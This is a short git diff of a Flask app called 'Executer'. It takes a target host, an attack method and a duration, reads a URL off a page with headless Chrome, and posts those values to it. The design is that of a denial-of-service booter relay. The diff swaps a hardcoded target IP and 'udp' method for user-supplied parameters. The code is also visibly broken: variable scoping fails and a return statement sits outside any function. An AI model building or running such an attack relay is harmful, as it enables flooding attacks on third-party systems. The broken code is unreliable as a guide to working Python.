@@ -8,6 +8,10 @@ import requests
 from requests.structures import CaseInsensitiveDict
 import time
 import os
+
+prehost = "";
+premethod = "";
+prelength = "";
 app = Flask(__name__)
 
 
@@ -20,14 +24,22 @@ def index():
     print("Please fill out the required!");
   else:
     print(host);
+    prehost = host;
   if method == None:
     print("Please fill out the required!");
   else:
     print(method);
+    premethod = method;
   if length == None:
     print("Please fill out the required!");
   else:
-    print(length);
+    print(length)
+    prelength = length;
+    execute();
+return '{Executer: Online}'
+
+
+def execute():
     CHROMEDRIVER_PATH = os.environ.get('CHROMEDRIVER_PATH', '/usr/local/bin/chromedriver')
     GOOGLE_CHROME_BIN = os.environ.get('GOOGLE_CHROME_BIN', '/usr/bin/google-chrome')
     options = Options()
@@ -43,8 +55,7 @@ def index():
     url = driver.execute_script("return document.getElementById('weburl').innerText;")
     print(url)
     time.sleep(2)
-    requests.post(url+"?host=137.184.30.68&method=udp&time=11")
-    time.sleep(int(length))
+    requests.post(url+"?host="+prehost+"&method="+premethod+"&time="+prelength+"")
+    time.sleep(int(prelength))
     driver.quit();
-  return '{Executer: Online}'
 
